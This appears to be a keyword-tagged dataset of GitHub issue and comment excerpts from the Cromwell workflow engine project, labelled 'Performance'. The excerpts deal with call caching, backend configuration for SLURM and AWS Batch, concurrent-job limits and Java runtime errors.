Performance,"I have ; ```; java version ""1.8.0_172""; Java(TM) SE Runtime Environment (build 1.8.0_172-b11); ```; and I was getting ; ```; Exception in thread ""main"" java.lang.UnsupportedClassVersionError: org/hsqldb/jdbcDriver has been compiled by a more recent version of the Java Runtime (class file version 55.0), this version of the Java Runtime only recognizes class file versions up to 52.0; 	at java.lang.ClassLoader.defineClass1(Native Method); 	at java.lang.ClassLoader.defineClass(ClassLoader.java:763); 	at java.security.SecureClassLoader.defineClass(SecureClassLoader.java:142); 	at java.net.URLClassLoader.defineClass(URLClassLoader.java:467); 	at java.net.URLClassLoader.access$100(URLClassLoader.java:73); 	at java.net.URLClassLoader$1.run(URLClassLoader.java:368); 	at java.net.URLClassLoader$1.run(URLClassLoader.java:362); 	at java.security.AccessController.doPrivileged(Native Method); 	at java.net.URLClassLoader.findClass(URLClassLoader.java:361); 	at java.lang.ClassLoader.loadClass(ClassLoader.java:424); 	at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:349); 	at java.lang.ClassLoader.loadClass(ClassLoader.java:357); 	at com.zaxxer.hikari.HikariConfig.attemptFromContextLoader(HikariConfig.java:970); 	at com.zaxxer.hikari.HikariConfig.setDriverClassName(HikariConfig.java:480); 	at slick.jdbc.hikaricp.HikariCPJdbcDataSource$.$anonfun$forConfig$3(HikariCPJdbcDataSource.scala:33); 	at slick.jdbc.hikaricp.HikariCPJdbcDataSource$.$anonfun$forConfig$3$adapted(HikariCPJdbcDataSource.scala:33); 	at scala.Option.foreach(Option.scala:437); 	at slick.jdbc.hikaricp.HikariCPJdbcDataSource$.forConfig(HikariCPJdbcDataSource.scala:33); 	at slick.jdbc.hikaricp.HikariCPJdbcDataSource$.forConfig(HikariCPJdbcDataSource.scala:21); 	at slick.jdbc.JdbcDataSource$.forConfig(JdbcDataSource.scala:47); 	at slick.jdbc.JdbcBackend$DatabaseFactoryDef.forConfig(JdbcBackend.scala:341); 	at slick.jdbc.JdbcBackend$DatabaseFactoryDef.forConfig$(JdbcBackend.scala:337); 	at slick.jdbc.JdbcBackend$$",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6830:982,load,loadClass,982,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6830,1,['load'],['loadClass']
Performance,"I have a feeling the message is coming from an underlying Unix command like; ```; $ md5 ~; md5: /Users/anichols: Is a directory; ```; That said, the Cromwell product does seem to make a promise that it can hash & call-cache directories, and I am having trouble reconciling those two premises.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5737#issuecomment-671414437:218,cache,cache,218,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5737#issuecomment-671414437,1,['cache'],['cache']
Performance,"I have a simple workflow with the following input cache structure:. ```json; {; ""String sampleName"": ""1B5BE2D031348FBA1A6E8624811B57E3"",; ""File reference"": ""1f6b1b1dff750c107f19d3fbc4c7ac90"",; ""File reference_bwt"": ""1f6b1b1dff750c107f19d3fbc4c7ac90"",; ""File reads"": [; ""fa22ef528d4abd40315c885e784ff6c2"",; ""df337314b38af64554899eb5ebe81c74""; ]; }; ```. When I rerun the workflow I purely get a `cacheMiss`, but the metadata comparison between two of the inputs gives the following error:. ```; {; ""status"": ""error"",; ""message"": ""Failed to calculate diff for call A and call B:\nFailed to extract relevant metadata for call A (f9a2bfe7-a173-439f-8c39-4bca22552a22 / BwaAligner.bwamem:-1) (reason 1 of 1): Cannot extract hashes for File reads. Expected JsString or JsObject but got JsArray [\""ec4ed7c97d38063d4ad0587812c034e8\"",\""083ce2cf30923ff510378b1c63feb0b6\""]\nFailed to extract relevant metadata for call B (e6f82c61-4d10-4c7e-9122-815658bb874c / BwaAligner.bwamem:-1) (reason 1 of 1): Cannot extract hashes for File reads. Expected JsString or JsObject but got JsArray [\""fa22ef528d4abd40315c885e784ff6c2\"",\""df337314b38af64554899eb5ebe81c74\""]"",; ""errors"": {; ""JsArray"": {; ""elements"": [; {; ""JsString"": {; ""value"": ""Failed to extract relevant metadata for call A (f9a2bfe7-a173-439f-8c39-4bca22552a22 / BwaAligner.bwamem:-1) (reason 1 of 1): Cannot extract hashes for File reads. Expected JsString or JsObject but got JsArray [\""ec4ed7c97d38063d4ad0587812c034e8\"",\""083ce2cf30923ff510378b1c63feb0b6\""]""; }; },; {; ""JsString"": {; ""value"": ""Failed to extract relevant metadata for call B (e6f82c61-4d10-4c7e-9122-815658bb874c / BwaAligner.bwamem:-1) (reason 1 of 1): Cannot extract hashes for File reads. Expected JsString or JsObject but got JsArray [\""fa22ef528d4abd40315c885e784ff6c2\"",\""df337314b38af64554899eb5ebe81c74\""]""; }; }; ]; }; }; }; ```. I presume this means that `processField` [[CallCacheDiffActor.scala#L164-L168](https://github.com/broadinstitute/cromwell/blob/8415afa3ee7ffe83",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5348:50,cache,cache,50,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5348,2,['cache'],"['cache', 'cacheMiss']"
Performance,"I have a workflow where one of the inputs was created by a brand-new version of a tool, but it had a cache-hit for a run from 2 months ago. I can only assume that this is because the new input file had the exact same hash as the old input file, but because the google bucket the old input file was in is gone, I have no way to confirm this. It seems like it would be fairly trivial, and extremely helpful, for this information to be contained in the call_caching_placeholder.txt, or some equivalent file when outputs are copied. Thanks!",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2681:101,cache,cache-hit,101,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2681,1,['cache'],['cache-hit']
Performance,"I have already changed that setting, as it was causing a different error. my aws.conf:. ```; include required(classpath(""application"")). aws {; application-name = ""cromwell""; auths = [{; name = ""default""; scheme = ""default""; }]; region = ""us-east-1""; }. engine { filesystems { s3 { auth = ""default"" } } }. backend {; default = ""AWSBATCH""; providers {; AWSBATCH {; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; config {; numSubmitAttempts = 3; numCreateDefinitionAttempts = 3; root = ""s3://concr-genomics-results/cromwell-execution""; auth = ""default""; concurrent-job-limit = 16; default-runtime-attributes { queueArn = ""arn:aws:batch:us-east-1:<##########>:job-queue/GenomicsDefaultQueue-<###########>"" }; filesystems { s3 { auth = ""default"" } }; }; }; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-435016997:587,concurren,concurrent-job-limit,587,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-435016997,3,"['concurren', 'queue']","['concurrent-job-limit', 'queue', 'queueArn']"
Performance,"I have caught cromwell red-handed! I did not realize that the cromwell timing was implemented in [TrumpScript](https://github.com/samshadwell/TrumpScript). **TL;DR** The timing diagram showed that my job took > 2 hours to run, even though half of that was spent on overhead in cromwell. ; ## Proof. Here is a snapshot of the timing diagram (see highlighted runtime below -- 2h 6m).; ![cromwell_snapshot_so_slow_lies](https://cloud.githubusercontent.com/assets/2152339/18798566/23db7738-81a1-11e6-8a39-43612a561aa7.png); Yet, when I check that job:. ```; $ head -5 cromwell-executions/case_gatk_acnv_workflow/0050770f-ad61-49e4-bc81-3b0e5f5e2203/call-TumorCalculateTargetCoverage/shard-10/execution/stdout. 17:06:18.839 INFO IntelGKLUtils - Trying to load Intel GKL library from:; jar:file:/root/gatk-protected/build/libs/gatk-protected-all-24e6bdc-SNAPSHOT-spark_standalone.jar!/com/intel/gkl/native/libIntelGKL.so; 17:06:19.327 INFO IntelGKLUtils - Intel GKL library loaded from classpath.; 17:06:19.353 INFO CalculateTargetCoverage - Defaults.BUFFER_SIZE : 131072; 17:06:19.355 INFO CalculateTargetCoverage - Defaults.COMPRESSION_LEVEL : 5. $ tail -5 cromwell-executions/case_gatk_acnv_workflow/0050770f-ad61-49e4-bc81-3b0e5f5e2203/call-TumorCalculateTargetCoverage/shard-10/execution/stdout; 18:10:04.122 INFO CalculateTargetCoverage - Writing counts ...; 18:10:05.250 INFO CalculateTargetCoverage - Writing counts done.; 18:10:05.250 INFO CalculateTargetCoverage - Shutting down engine; ```. The job finished in about 64 minutes (please note that timezones are not concordant between timing and log messages).; This will likely (de facto) be addressed once the md5 issue is resolved in issue #1483",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1484:750,load,load,750,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1484,2,['load'],"['load', 'loaded']"
Performance,"I have configured a SLURM backend for Cromwell and have encountered unusual behavior while trying to configure memory as a runtime attribute. . I define a runtime attribute Int with default value in my Cromwell configuration file and attempt to override this in my task WDL. Whether the override succeeds seems to depend on the variable name used! This is very confusing behavior; I expect to either receive a message that a variable name is not allowed, or the override should succeed. . Fails: ""memory_mb""; Succeeds: ""requested_memory_per_core"". I am verifying whether the override succeeds by checking the Cromwell output [task]/execution/script.submit. . ```; SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; runtime-attributes = """"""; Int runtime_minutes = 600; Int bsub_cpu = 1; Int memory_mb = 1000; String queue; """"""; ; submit = """"""; 			sbatch -J ${job_name} -D ${cwd} -o ${out} -e ${err} -t ${runtime_minutes} -p ${queue} \; 			${""-n "" + bsub_cpu} \; 			--mem-per-cpu=${memory_mb} \; 			--wrap ""/bin/bash ${script}""; 		""""""; kill = ""scancel ${job_id}""; check-alive = ""squeue -j ${job_id}""; job-id-regex = ""Submitted batch job (\\d+).*""; }; }; ```. ```; workflow tutorialWorkflow{; 	call task_A { input : in=""testing"" }; 	call task_B { input : in=task_A.out }; 	call task_C { input : in=task_A.out }; }. task task_A{; 	String in. 	command{; 		echo 'This is task A ${in}.'; 	}	; 	output{; 		String out='This is task A ${in}'; 	}; 	runtime{; 		bsub_cpu: 1; 		runtime_minutes: 10; 		memory_mb: 100; 		queue: ""short""; 	}; }. task task_B{; 	String in; 	command{; 		echo 'This is task B ${in}.'; 	}; 	runtime{; 		bsub_cpu: 2; 		runtime_minutes: 15; 		memory_mb: 110; 		queue: ""short""; 	}; }. task task_C{; 	String in; 	command{; 		echo 'This is task C ${in}.'; 	}; 	runtime{; 		runtime_minutes: 25; 		memory_mb: 210; 		queue: ""short""; 	}; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2068:870,queue,queue,870,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2068,5,['queue'],['queue']
Performance,"I have moved to cromwell v53.1 now. However the caching still doesn't work for me. I consistently get an error like this:. > 2020-11-07 17:54:51,634 cromwell-system-akka.dispatchers.engine-dispatcher-35 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 (EnhancedCromwellIoException: [Attempted 1 time(s)] - RejectedExecutionException: ); > 2020-11-07 17:54:51,635 cromwell-system-akka.dispatchers.engine-dispatcher-35 WARN - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Invalidating cache entry CallCachingEntryId(347) (Cache entry details: Some(7b292def-1477-4450-988a-e01627d61786:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0)); > 2020-11-07 17:54:51,673 cromwell-system-akka.dispatchers.backend-dispatcher-7385 WARN - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-BackendCacheHitCopyingActor-0123c178:GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:-1:1-5 [UUID(0123c178)GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1]: Unrecognized runtime attribute keys: preemptible; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-38 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1 [UUID(0123c178)]: Call cache hit process had 0 total hit failures before completing successfully; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-33 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Could not copy a suitable cache hit for 0123c178:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1. EJEA attempted to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Fa",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:352,cache,cache,352,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807,3,"['Cache', 'cache']","['Cache', 'cache']"
Performance,"I have run both strategies with a workflow that generates around about 2000 jobs (100 samples) using GATK best practices for RNA variant calling. . ### Method. The Cromwell instance ran with a SLURM cluster backend. All jobs were run using singularity containers. The cromwell process was limited to 3 akka threads and 1 GC thread (by default it grabs al threads on the login node, and this is not fair to other users). The HSQLDB memory database with persistance file was used. Said SLURM cluster has its storage connected via NFS. Two configurations of cromwell were used. One with the xxh64 strategy, and one with the fingerprint strategy. Each cromwell instance was executed in its own directory, with its own database and own cromwell-executions folder. The [BioWDL RNA-seq](https://github.com/biowdl/rna-seq) workflow was run. After running, the workflow was run again to see if the call-caching worked correctly. ### Results; Both `xxh64` and `fingerprint` strategies were able to rerun the workflow with a 100% Cache hit. The fingerprint strategy however was much quicker:; `time` results for fingerprint; ```; real 23m26.269s; user 15m31.229s; sys 2m43.406s; ```; `time` results for xxh64; ```; real 69m12.478s; user 56m7.371s; sys 52m6.262s; ```. ### Conclusion; Using xxh64 as a strategy requires some calculation but one hour for 100 samples on 2000 jobs is quite acceptable. What is obvious is that the system IO (`sys` time) takes a lot of time as well. This cluster has very fast optimized ISILON storage, but on clusters without this, any hashing strategy can be quite slow because of this. The fingerprint works very well for HPC environments.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-601604438:1019,Cache,Cache,1019,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-601604438,2,"['Cache', 'optimiz']","['Cache', 'optimized']"
Performance,"I have run: ; Workflow: https://github.com/FredHutch/reproducible-workflows/blob/master/WDL/unpaired-panel-consensus-variants-human/broad-containers-workflow.wdl; Inputs: https://github.com/FredHutch/reproducible-workflows/blob/master/WDL/unpaired-panel-consensus-variants-human/broad-containers-inputs.json. Now three times directly with the same input data and every single time for every single task (so the file that is the result of the first task from a previous run of this workflow does not get reused for the second task fo the current run of the workflow, and so on for all the tasks in the entire workflow) I have gotten this:. ```; ""callCaching"": {; ""allowResultReuse"": true,; ""hit"": false,; ""result"": ""Cache Miss"",; ""hashes"": {; ""output count"": ""..."",; ""runtime attribute"": {; ""docker"": ""..."",; ""continueOnReturnCode"": ""..."",; ""failOnStderr"": ""...""; },; ""output expression"": {; ""File output_fastq"": ""..""; },; ""input count"": "".."",; ""backend name"": ""..."",; ""command template"": ""..."",; ""input"": {; ""String base_file_name"": ""..."",; ""File input_bam"": ""...""; }; },; ""effectiveCallCachingMode"": ""ReadAndWriteCache""; ```. So it's not timing out anymore (I replaced hashes with '...'), but never, ever having a `""hit"": true`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-457360546:715,Cache,Cache,715,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-457360546,1,['Cache'],['Cache']
Performance,"I have the exact same issue. First of all, both the [Configuration examples](https://cromwell.readthedocs.io/en/stable/Configuring/#configuration-examples) and [Local](https://cromwell.readthedocs.io/en/stable/backends/Local/) sections of the documentation point to non-existing file https://github.com/broadinstitute/cromwell/tree/develop/cromwell.examples.conf while they should point to https://github.com/broadinstitute/cromwell/blob/develop/cromwell.example.backends/cromwell.examples.conf like lozybean pointed out. This is still not fixed in the documentation. But then I have downloaded the [cromwell.examples.conf](https://raw.githubusercontent.com/broadinstitute/cromwell/develop/cromwell.example.backends/cromwell.examples.conf) file and used it as follows:; ```; wget https://raw.githubusercontent.com/broadinstitute/cromwell/develop/cromwell.example.backends/cromwell.examples.conf; sed -i 's/#concurrent-job-limit = 5/concurrent-job-limit = 5/' cromwell.examples.conf; java -Dconfig.file=cromwell.examples.conf -jar cromwell-51.jar run ...; ```. And Cromwell on my laptop still spawned 23 job tasks simultaneously. What do I have to do to limit the number of concurrent jobs? This would be very convenient for me to be able to speed up development of my own WDL. Thank you!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5359#issuecomment-649697302:907,concurren,concurrent-job-limit,907,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5359#issuecomment-649697302,3,['concurren'],"['concurrent', 'concurrent-job-limit']"
Performance,"I have to note that I didn't make this configuration (@rhpvorderman will know more about this); This is in the backend section:; ```; caching {; duplication-strategy: [ ""soft-link"", ""copy"", ""hard-link"" ]; hashing-strategy: ""file""; }; ```; This is on the top level:; ```; call-caching {; enabled = true; invalidate-bad-cache-results = true; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3717#issuecomment-393886848:318,cache,cache-results,318,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3717#issuecomment-393886848,1,['cache'],['cache-results']
Performance,"I have, really weird behavior for File? I expect that if file does not exist I should get null for File? (as there are no wld functions that actually check for file existance), however instead I get an error:; ```; Workflow failed; WorkflowFailure(,List(WorkflowFailure(Could not process output, file not found: /pipelines/scripts/cromwell-executions/quantification/87596324-9f68-4419-b3ce-6ff47fe381b4/call-prepare_samples/execution/not_exist,List()))); ```; ```wdl; task prepare_samples {; File samples; File references; File samples_folder. command {; /scripts/run.sc --samples ${samples} --references ${references} --cache ${samples_folder}; }. runtime {; docker: ""quay.io/comp-bio-aging/prepare-samples@sha256:9aaa223ff520634bb0357500ffb90aa80315729e0870ebbc7da4a4b31c382a2c""; }. output {; File? invalid = ""invalid.tsv""; File? novel = ""novel.tsv""; #File? cached = ""cached.tsv""; File? cached = ""not_exist"" #I expect it to be null if the file does not exist; }; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3367:621,cache,cache,621,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3367,4,['cache'],"['cache', 'cached']"
Performance,I haven't seen this happen live but in theory 'take' can throw an exception if the underlying queue changes between checking `available` and running `dequeue`. That might happen if an unluckily timed `abort` removes an actor from the queue between those checks.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4165:94,queue,queue,94,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4165,2,['queue'],['queue']
Performance,"I honestly have not really pulled docker images without Cromwell before, other than on my laptop for minimal testing. If I try to pull a docker manually I do get the same error, as you suggested, even if the Google VM and the GCR bucket are both running on the same Google Cloud network. Isn't this a bad design from Google though? How do I make my dockers available for my WDLs and on Terra while at the same time preventing actors running the same WDLs in Google Clouds in other continents from forcing me to incur egress charges? I must be missing something. I see two possible alternative partial solutions for this issue:. (i) is there a way to write a WDL so that it automatically detects whether it should use `us.gcr.io`, or `eu.gcr.io` or `asia.gcr.io` and so that it would automatically select the one that is closer (and free)? I suppose not, as this would be outside the specification of WDL. Curios what you think though. (ii) is there a way to prevent Cromwell running with PAPIv2 from having to pull a docker image multiple time? I wrote WDLs that run on large cohorts (biobank size) and they can scatter task arrays with ~1,000 shards. If this resulted in pulling a docker once, absorbing the cost would likely still be scalable, but as it is now it is very inefficient and it makes the cost of running the WDL almost dominated by the pulling of the dockers if egress costs are involved. [Notice also that someone from the VA run my WDL but I think that, since the computation was performed on an LSF HPC cluster, the docker image was pulled only once and then reused within the LSF HPC cluster, as I did not notice any significant egress costs when this happened]. @cjllanwarne thank you for reaching out to Google. I hope this spurs a broader discussion. I am not in urgent need for a fix, but I very much hope a solution is available in the long term.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-814160702:1236,scalab,scalable,1236,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-814160702,2,"['perform', 'scalab']","['performed', 'scalable']"
Performance,"I love the failure type but since you've done so much, would it be another load of work to use `sttp` + cats-effect backend vs the source of our Future woes, akka?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4624#issuecomment-462491136:75,load,load,75,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4624#issuecomment-462491136,1,['load'],['load']
Performance,"I made some comments regarding concurrency & thread safety. Those weren't a roundabout way of me saying I thought there _was_ a problem, rather I just wanted to make sure that was thought through due to the way that's being called. 👍 . [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/1273/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1273#issuecomment-238712758:31,concurren,concurrency,31,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1273#issuecomment-238712758,1,['concurren'],['concurrency']
Performance,"I might be missing something but thinking about it more, I don't think a job can technically really ""cache to itself"", that is because if a workflow is restarted mid run, outputs are retrieved from the job store first (for jobs that had completed), and we shouldn't be even trying to call cache it. It could be caching to another workflow though.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4046#issuecomment-416668196:101,cache,cache,101,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4046#issuecomment-416668196,2,['cache'],['cache']
Performance,I notice the Singularity Cache is now the second topic within Singularity. Do you mind if I put it back at the end? I don't think there's any need to confuse users with it immediately. @illusional,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-465392789:25,Cache,Cache,25,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-465392789,1,['Cache'],['Cache']
Performance,"I posted at the [following link](https://github.com/broadinstitute/cromwell/issues/404#issuecomment-177665209), a recommendation to turn the `LocalBackend.scala` into a finite-state machine (FSM) as well - besides `WorkflowManagerActor` in PR https://github.com/broadinstitute/cromwell/pull/413 - and catch when the script performs a `SIGINT`:. https://github.com/broadinstitute/cromwell/issues/404#issuecomment-177665209. ~p",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/397#issuecomment-177668094:323,perform,performs,323,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/397#issuecomment-177668094,1,['perform'],['performs']
Performance,"I ran a couple workflows, against 0.19 and against develop (considering the workflow id wrapping issue is resolved). Here are some differences I found, there might be other that those workflow didn't catch.; - The ""Collector"" of a scatter is present in the metadata in develop, and wasn't in 0.19. Oddly it doesn't contain its output though : . ```; {; ""attempt"": 1,; ""executionStatus"": ""Done"",; ""shardIndex"": -1; }; ```; - `stdout` and `stderr` are missing (**Local only**); - `runtimeAttributes` is missing ; Completely missing on local.; On JES, only attributes in the WDL show up, those for which the default value was used are missing.; - `executionEvents` is missing (even if there is none, there is an attribute with an empty list in 0.19); - `cache` is missing (**Local only**); e.g. ```; ""cache"": {; ""allowResultReuse"": true; }; ```; - `inputs` at the call level is missing if there are no inputs (`""inputs"" : {}` was present in 0.19); - `inputs` at the workflow level is missing if there are no inputs (`""inputs"" : {}` was present in 0.19); - `outputs` at the workflow level is missing if there are no inputs (`""outputs"" : {}` was present in 0.19); - Scatter keys are shown in develop's metadata as a normal call:. ```; ""w.$scatter_0"": [; {; ""attempt"": 1,; ""executionStatus"": ""Done"",; ""shardIndex"": -1; }; ]; ```; - `submission` is missing; - In 0.19, all ""first level"" (non-shards) calls would appear in the metadata right away, with a `NotStarted` status and some basic available information:. ```; ""example.gatherUltimateAnalysis"": [; {; ""executionStatus"": ""NotStarted"",; ""shardIndex"": -1,; ""outputs"": {},; ""runtimeAttributes"": {},; ""cache"": {; ""allowResultReuse"": true; },; ""inputs"": {; ""array"": ""ultimateAnalysis.out""; },; ""backend"": ""JES"",; ""attempt"": 1,; ""executionEvents"": []; }; ]; ```. In develop, a call appears in the metadata only at runtime; - `backendStatus` has been renamed to `jesOperationStatus` (JES status)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/936#issuecomment-223718341:751,cache,cache,751,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/936#issuecomment-223718341,3,['cache'],['cache']
Performance,"I ran into a related issue while running the ENCODE HiC pipeline via Caper on SLURM. I opened an issue there too. On our HPC I need to `module load cuda/11.7` to use the `nvcc` binary. I tried `--wrap='module load cuda/11.7'` but while this gets passed to the `sbatch` command it returns a script argument not permitted error, possibly because `module` isn't a binary but a bash function? Are there any other options for using Caper/Cromwell with the `module` system?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4997#issuecomment-1430297902:143,load,load,143,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4997#issuecomment-1430297902,2,['load'],['load']
Performance,"I ran it using json ways and after configuring mysql and Call Caching it is still create a new project. here is my commands and config file. ```; java -jar -Dconfig.file=/work/share/ac7m4df1o5/bin/cromwell/3_config/udocker_slum.conf ../cromwell-84.jar run /work/share/ac7m4df1o5/bin/cromwell/1_pipeline/Exome_Germline_Single_Sample/ExomeGermlineSingleSample_v3.1.5.wdl -i D5327.NA12878.json -o ../options.json; ```. conf is. ```; include required(classpath(""application"")). docker {; hash-lookup {; enable = false; }; }; call-caching {; enabled = true; invalidate-bad-cache-results = true; }. backend {; default = slurm. providers {; slurm {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"" ; config {; 	concurrent-job-limit = 5; runtime-attributes = """"""; Int runtime_minutes = 600; Int cpus = 2; Int requested_memory_mb_per_core = 8000; String? docker; """""". submit = """"""; sbatch \; --wait \; -J ${job_name} \; -D ${cwd} \; -t ${runtime_minutes} \; 	 -p wzhcexclu06 \; ${""-c "" + cpus} \; --mem-per-cpu=${requested_memory_mb_per_core} \; --wrap ""/bin/bash ${script}""; """""". submit-docker = """"""; # Pull the image using the head node, in case our workers don't have network access; # udocker pull ${docker}. sbatch \; -J ${job_name} \; -D ${cwd} \; -t ${runtime_minutes} \; 	 -p wzhcexclu06 \; ${""-c "" + cpus} \; --mem-per-cpu=${requested_memory_mb_per_core} \; --wrap ""udocker run -v ${cwd}:${docker_cwd} ${docker} ${job_shell} ${docker_script}""; """""". kill = ""scancel ${job_id}""; check-alive = ""squeue -j ${job_id}""; job-id-regex = ""Submitted batch job (\\d+).*""; }; }; }; }. ```. help pleas",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6920:568,cache,cache-results,568,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6920,2,"['cache', 'concurren']","['cache-results', 'concurrent-job-limit']"
Performance,"I read this as complaining about having all of the separate calls + the logic to dig into the config everywhere, not a complaint about physically loading the config. That said, having looked at this w/ that lens a few times I never saw a way that'd work everywhere which would be better than doing the above",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/796#issuecomment-234340037:146,load,loading,146,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/796#issuecomment-234340037,1,['load'],['loading']
Performance,"I realize this may seem like a regression but hear my plea:. The output of `diff(expected, actual)` looks like; ```; [; {; ""op"": ""replace"",; ""path"": ""Chain(Left(calls), Left(test_custom_cacheworthy_attributes.custom_cacheworthy_attributes_task_should_not_cache), Right(0), Left(executionStatus))"",; ""value"": ""Done""; }; ]; ```; which is to say that the value at path; ```; /calls/test_custom_cacheworthy_attributes.custom_cacheworthy_attributes_task_should_not_cache/0/executionStatus; ```; is `Done` in `actual` and something else in `expected`. The problem is that `Done` sounds right and there is no way to tell what is in `expected`! In this style of tests `expected` is computed from actual metadata and I think it's the cause of the flakiness. Perhaps we are retrieving `expected` metadata before the task finishes, or it is being call-cached when it should not be.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6435:841,cache,cached,841,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6435,1,['cache'],['cached']
